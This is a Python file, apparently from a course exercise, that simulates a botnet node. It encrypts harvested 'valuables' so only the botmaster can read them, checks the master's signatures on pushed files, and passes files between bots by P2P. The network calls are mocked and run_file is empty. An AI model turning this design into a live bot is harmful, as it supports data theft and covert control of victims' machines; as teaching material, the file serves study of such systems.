import os
from Crypto.Hash import SHA256
from Crypto.Signature import PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto import Random
from Crypto.Cipher import AES
from lib.helpers import ANSI_X923_pad, ANSI_X923_unpad

# Instead of storing files on disk,
# we'll save them in memory for simplicity
filestore = {}
valuables = []  # Valuable data to be sent to the botmaster
SIGN_LEN = 256  # The length of the signature

pubkey_txt = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw/wcO39pKTQ+ArqB0oVE
ouQdNW2XJxEOiTaKggwABqQMO1ux4HxJ1obSx2WRI+1XmytQiGEvUp0vSX4sP9W3
gE6eiPtt7S77XRv3xkvL2UfVpoqwq9zrKRupCiSmOXzZodf1WPResWJ/0x9CIFCy
N0b7UprQWz14mCNh+2+GnMfx1kAKabhMMeviuHqkeAlc34hvluQwb6ipa7lrmZnA
/nbRlaflPOesIcjh/rzT0gGMNwrVV66W/aufzntjdQ8sy4EhowL4nG5LJ9cwYNTs
RRlfyjLmVzM06VIsOGvwITT8C8m1NeN69YcA78dwpUc0O/ddQNbijbnws1D0bcI7
CwIDAQAB
-----END PUBLIC KEY-----"""


def save_valuable(data):
  valuables.append(data)

def encrypt_for_master(data):
  # Encrypt the file so it can only be read by the bot master
  # Generate a random iv and Key to create AES cipher
  iv      = Random.get_random_bytes(AES.block_size)
  symmkey = Random.get_random_bytes(AES.block_size)
  cipher  = AES.new(symmkey, AES.MODE_OFB, iv)

  # Encrypt the data using the derived symmetric key
  data_to_encrypt = ANSI_X923_pad(data, cipher.block_size)
  ciphertext      = cipher.encrypt(data_to_encrypt)
  
  # Use the public rsa key to encrypt iv and the symmetric key
  pubkey       = RSA.importKey(pubkey_txt)
  rsa_cipher   = PKCS1_OAEP.new(pubkey)
  encrypt_cipher_info = rsa_cipher.encrypt(iv + symmkey)
  
  return encrypt_cipher_info + ciphertext

def upload_valuables_to_pastebot(fn):
  # Encrypt the valuables so only the bot master can read them
  valuable_data = "\n".join(valuables)
  valuable_data = bytes(valuable_data, "ascii")
  encrypted_master = encrypt_for_master(valuable_data)

  # "Upload" it to pastebot (i.e. save in pastebot folder)
  f = open(os.path.join("pastebot.net", fn), "wb")
  f.write(encrypted_master)
  f.close()

  print("Saved valuables to pastebot.net/%s for the botnet master" % fn)

def verify_file(f):
  # Verify the file was sent by the bot master
  signature = f[:SIGN_LEN]
  pubkey    = RSA.importKey(pubkey_txt)
  h = SHA256.new(f[SIGN_LEN:])
  verifier = PKCS1_v1_5.new(pubkey)
  
  return verifier.verify(h, signature)
  
def process_file(fn, f):
  if verify_file(f):
    # If it was, store it unmodified
    # (so it can be sent to other bots)
    # Decrypt and run the file
    filestore[fn] = f
    print("Stored the received file as %s" % fn)
  else:
    print("The file has not been signed by the botnet master")

def download_from_pastebot(fn):
  # "Download" the file from pastebot.net
  # (i.e. pretend we are and grab it from disk)
  # Open the file as bytes and load into memory
  if not os.path.exists(os.path.join("pastebot.net", fn)):
    print("The given file doesn't exist on pastebot.net")
    return
  f = open(os.path.join("pastebot.net", fn), "rb").read()
  process_file(fn, f)

def p2p_download_file(sconn):
  # Download the file from the other bot
  fn = str(sconn.recv(), "ascii")
  f = sconn.recv()
  print("Receiving %s via P2P" % fn)
  process_file(fn, f)

def p2p_upload_file(sconn, fn):
  # Grab the file and upload it to the other bot
  # You don't need to encrypt it only files signed
  # by the botnet master should be accepted
  # (and your bot shouldn't be able to sign like that!)
  if fn not in filestore:
    print("That file doesn't exist in the botnet's filestore")
    return
  print("Sending %s via P2P" % fn)
  sconn.send(bytes(fn, "ascii"))
  sconn.send(filestore[fn])

def run_file(f):
  # If the file can be run,
  # run the commands
  pass
